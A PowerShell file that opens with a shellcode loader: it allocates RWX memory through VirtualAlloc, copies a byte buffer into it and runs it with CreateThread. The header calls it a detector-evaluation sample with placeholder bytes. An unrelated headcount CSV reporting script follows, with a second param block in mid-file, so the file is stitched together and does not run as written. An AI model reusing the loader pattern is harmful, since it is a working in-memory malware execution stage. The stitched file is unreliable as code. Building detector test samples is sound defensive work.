<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x0e, 0xb1, 0x97, 0xea, 0xde, 0x71, 0x04, 0xbd, 0x1f, 0x48, 0x08, 0xf1, 0x21, 0xfd, 0x52, 0x65,
    0xd5, 0xb8, 0xfb, 0xf2, 0x46, 0x81, 0xef, 0xc3, 0xda, 0xaa, 0xec, 0x88, 0xd2, 0xd2, 0x89, 0x9a,
    0xe2, 0xcd, 0x31, 0x98, 0x7b, 0x60, 0x3c, 0x09, 0x72, 0xf3, 0x92, 0x62, 0xbd, 0x10, 0x1f, 0x71,
    0x66, 0xb2, 0x33, 0x44, 0x29, 0x67, 0xaa, 0x64, 0x47, 0x6f, 0x8e, 0x4e, 0x0e, 0x54, 0x6a, 0xfa,
    0xb0, 0x5f, 0x46, 0x74, 0xe1, 0x87, 0x79, 0x8c, 0x26, 0x41, 0xad, 0x31, 0x41, 0xe5, 0x81, 0xff,
    0x56, 0x32, 0x63, 0x51, 0x40, 0xe8, 0xd8, 0xb2, 0x11, 0xbf, 0x99, 0x30, 0xca, 0xc1, 0xd6, 0xf8,
    0xda, 0xbd, 0x93, 0xaf, 0x61, 0xff, 0xe9, 0x4d, 0xa2, 0x39, 0xf1, 0x88, 0xe9, 0x83, 0x60, 0xa2,
    0x47, 0x52, 0x60, 0x00, 0x0f, 0x83, 0xa1, 0x68, 0xfe, 0x31, 0xaa, 0x05, 0xbb, 0xb3, 0x01, 0x0c,
    0x32, 0x4e, 0xee, 0x01, 0x4d, 0x27, 0x80, 0x24, 0xf5, 0xe4, 0xe9, 0x61, 0xce, 0xa1, 0x85, 0x2c,
    0x5f, 0x77, 0xb3, 0xfc, 0xd8, 0xeb, 0x7d, 0xbc, 0x3c, 0xf6, 0xef, 0x0b, 0x8d, 0x0c, 0xcd, 0x29,
    0x57, 0xec, 0x51, 0xa6, 0x90, 0x62, 0x3c, 0x61, 0x48, 0x81, 0x02, 0x1a, 0xcc, 0xf3, 0xd6, 0xa0,
    0x8c, 0x8c, 0xa2, 0xa3, 0xd4, 0xe6, 0xa6, 0x62, 0x79, 0xf1, 0x66, 0xf8, 0xab, 0x73, 0x0f, 0x77,
    0x4f, 0x69, 0x1c, 0xd6, 0xa7, 0x52, 0x17, 0x1b, 0x69, 0x64, 0x9c, 0xe0, 0x26, 0x20, 0x37, 0x82,
    0xc8, 0x13, 0xd1, 0x38, 0x60, 0x7c, 0x41, 0xf9, 0xba, 0x6e, 0xeb, 0x46, 0xe8, 0xca, 0x11, 0x15,
    0x03, 0x5c, 0xf1, 0x49, 0xa7, 0x23, 0xff, 0x25, 0x28, 0x1d, 0x6d, 0x19, 0x9f, 0x00, 0x9d, 0x27,
    0x3a, 0x45, 0x5b, 0xab, 0x88, 0x48, 0xa2, 0x45, 0xca, 0x09, 0x62, 0x82, 0x97, 0x40, 0x04, 0xed,
    0x7a, 0x2e, 0x4b, 0x32, 0xf9, 0x65, 0xc2, 0xc2, 0x72, 0x82, 0x5d, 0x10, 0x51, 0x05, 0xd0, 0x04,
    0x35, 0x5c, 0x7e, 0x63, 0xea, 0x3d, 0xf0, 0x4a, 0x17, 0x14, 0x11, 0x2b, 0x03, 0x70, 0x48, 0xdb,
    0xaa, 0xb2, 0xd6, 0xe4, 0xe8, 0x31, 0x61, 0x8f, 0x2a, 0xd8, 0x0f, 0x4a, 0x1b, 0x00, 0x2d, 0x52,
    0x6e, 0xfe, 0xd4, 0xb1, 0xfa, 0xde, 0x3c, 0x61, 0x8d, 0x33, 0xe2, 0xf2, 0x8a, 0xe1, 0x8f, 0x21,
    0x2c, 0xc1, 0xf8, 0x53, 0xc6, 0x3e, 0x76, 0x96, 0xa5, 0xe3, 0x83, 0x10, 0xff, 0x3c, 0x28, 0x7e,
    0x46, 0x46, 0xca, 0xae, 0xb5, 0x74, 0xc4, 0x76, 0x9a, 0x78, 0xf9, 0x9c, 0xb6, 0x85, 0x2e, 0xcf,
    0x81, 0x25, 0xda, 0x4e, 0x98, 0x38, 0x2f, 0xf2, 0xcb, 0x7c, 0x94, 0xde, 0x74, 0x56, 0xfe, 0x6f,
    0x4d, 0xef, 0x10, 0x5a, 0x9c, 0x87, 0x45, 0x97, 0x98, 0x84, 0x16, 0xd1, 0x62, 0xcf, 0x9f, 0x2c,
    0x2c, 0x7d, 0x9a, 0x5b, 0x57, 0x79, 0x83, 0xe9, 0x6a, 0x80, 0xb5, 0xbc, 0x91, 0x79, 0x0c, 0x96,
    0x63, 0x8a, 0xa4, 0xde, 0x52, 0x69, 0x69, 0x2c, 0x19, 0xd9, 0xf6, 0xb4, 0x46, 0xbc, 0x07, 0x09,
    0x4e, 0xad, 0x50, 0x5c, 0xef, 0xb3, 0xaa, 0xbb, 0x11, 0xb8, 0x6b, 0xbc, 0x2f, 0x2d, 0x41, 0x6e,
    0x87, 0x9b, 0x72, 0x0c, 0xe6, 0xd7, 0x41, 0x35, 0x9e, 0xca, 0x93, 0xda, 0x22, 0x4a, 0xf2, 0x15,
    0x66, 0x42, 0xa9, 0x3e, 0x21, 0x58, 0x36, 0x4a, 0xae, 0x95, 0x39, 0x7b, 0x98, 0xfa, 0x27, 0x3a,
    0xad, 0xbf, 0x8b, 0x52, 0x3f, 0xf3, 0xf3, 0x60, 0x9f, 0xeb, 0x37, 0xec, 0xbf, 0x73, 0xad, 0xcf,
    0x5c, 0xad, 0x1d, 0xdf, 0x5e, 0x90, 0xbf, 0x1c, 0x90, 0x6d, 0x77, 0xd9, 0x6f, 0x6f, 0x0d, 0x9c
)

$BufferAddress = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 2564)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = 'C:\Data\exports\headcount.csv',

    [string]$OutputPath = "C:\Reports\headcount-summary-2026-03-16.csv",
    [Parameter(Mandatory = $false)]
    [ValidateSet('Department', 'Site')]
    [string]$GroupBy = "Site",
    [double]$MinAmount = 1000
)

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }
$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}
$byManager = $rows | Group-Object -Property Manager |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byManager | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Arial; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$byGroup | ConvertTo-Json -Depth 5 | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@adatum.com'
$MailFrom = 'bi@adatum.com'

Send-MailMessage -To $MailTo -From $MailFrom -Subject 'Headcount summary' `
    -Body $summaryBody -SmtpServer "smtp.adatum.com" -Port 25 -UseSsl

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
